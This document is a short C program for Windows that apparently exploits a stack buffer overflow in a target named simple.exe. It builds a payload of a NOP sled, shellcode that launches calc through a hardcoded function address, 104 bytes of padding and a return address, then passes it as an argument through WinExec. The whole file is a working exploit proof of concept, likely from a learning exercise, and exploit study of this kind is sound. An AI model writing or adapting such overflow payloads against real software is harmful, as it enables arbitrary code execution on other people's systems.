#include <stdio.h>
#include <windows.h>

int main(int argc, char **argv)
{
	char payload [] =	"simple.exe "
						"\x90\x90\x90\x90\x90\x90"
						"\x90\x90\x90\x90\x90\x90" //12 nops
						"\x31\xC9"
						"\x51"
						"\x68\x63\x61\x6C\x63"
						"\x54"
						"\xB8\xC7\x93\xC2\x77"
						"\xFF\xD0"
						"AAAAAAAAAA" //10
						"AAAAAAAAAA"
						"AAAAAAAAAA"
						"AAAAAAAAAA"
						"AAAAAAAAAA" //50
						"AAAAAAAAAA"
						"AAAAAAAAAA"
						"AAAAAAAAAA"
						"AAAAAAAAAA"
						"AAAAAAAAAA" //100
						"AAAA"		 //104
						"\x80\xFA\x13\x00";

	WinExec(payload, 0);
	return (0);
}
